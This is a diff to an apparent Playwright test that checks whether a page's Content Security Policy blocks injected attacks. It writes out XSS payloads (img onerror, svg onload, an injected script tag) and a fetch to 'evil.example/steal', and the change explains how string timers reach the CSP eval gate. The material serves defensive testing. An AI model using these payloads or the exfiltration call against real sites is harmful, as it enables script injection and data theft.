@@ -271,8 +271,11 @@ const stored=pg=>pg.evaluate(()=>JSON.stringify(normalize(JSON.parse(localStorag
      box.innerHTML='<img src="x" onerror="window.__pwn++"><svg onload="window.__pwn++"></svg>';
      const s=document.createElement('script'); s.textContent='window.__pwn++'; document.body.append(s);
      let fetched=true; try { await fetch('https://evil.example/steal'); } catch(e) { fetched=false; }
-     let evaled=true; try { eval('1'); } catch(e) { evaled=false; }
-     await new Promise(r=>setTimeout(r,200)); box.remove(); s.remove(); return {pwn:window.__pwn,fetched,evaled}; });
+     // eval from page code: a string timer goes through the same CSP gate as eval(); a direct eval() here would not,
+     // because Playwright runs this function as DevTools code, which Chrome lets past 'unsafe-eval'.
+     const vio=[]; document.addEventListener('securitypolicyviolation',e=>vio.push(e.violatedDirective+' '+e.blockedURI));
+     window.__ev=0; setTimeout('window.__ev=1',0);
+     await new Promise(r=>setTimeout(r,200)); const evaled=window.__ev===1 || !vio.includes('script-src eval'); box.remove(); s.remove(); return {pwn:window.__pwn,fetched,evaled}; });
    ok(r.pwn===0 && !r.fetched && !r.evaled,'CSP blocks injected handlers, injected scripts, eval and fetches to other hosts '+JSON.stringify(r));
    await c.close(); }
  // The shipped page runs on both real origins (the APK's assets and GitHub Pages) with no CSP violation, live sync included.
